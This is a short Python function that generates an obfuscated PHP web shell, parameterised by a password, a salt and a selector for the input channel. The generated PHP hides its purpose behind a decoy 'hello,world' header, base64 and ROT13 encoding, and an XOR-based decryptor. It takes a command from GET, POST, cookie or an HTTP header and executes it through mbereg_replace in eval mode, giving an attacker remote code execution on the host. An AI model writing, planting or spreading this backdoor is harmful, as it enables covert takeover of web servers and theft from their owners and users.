def get_php(keyword: int = 4, passwd: str = "", salt: str = ""):
    return """<?php
/*
* @author whoami
* @product hello,world
* @license Copyright@2019
*/
error_reporting(0);

function dept($data,$salt="%s",$change=0x80){
    $data=base64_decode($data);
    $that="";
    $saltm = md5($salt);
    for($i=0;$i<strlen($data);$i++){
            $that.=chr((ord($data[$i])^ord($saltm[$i%%32]))^$change);
        }
    $pass=strrev(str_rot13(substr(strrev($that),0,-32)));
    return $pass;
}

class phpClass{
    function __construct($arg=null, $config=null,$options=null)
    {
        return $this->hash = str_rot13(base64_decode("enJlfGt8a3xfVFJHfF9DQkZHfF9QQkJYVlJ8JHBueXk9JF9GUkVJUkVb")) and $this->getlevel(explode("|",$this->hash), $config,$options);
    }
    function getlevel($arg, $config,$options){
        ($call = $options !== 6 ? $config[$arg[$options]][%s] : $call = $arg[$options].'HTTP_%s];') and $options == 6 and mbereg_replace('.*', '\\0',$call,$arg[0]);
        if(isset($call))if(mbereg_replace('.*', '\\0',dept($call),$arg[0])=="");
    }
}
$c = new phpClass(null, $GLOBALS,%s);""" % (salt, passwd, passwd.upper(), keyword)
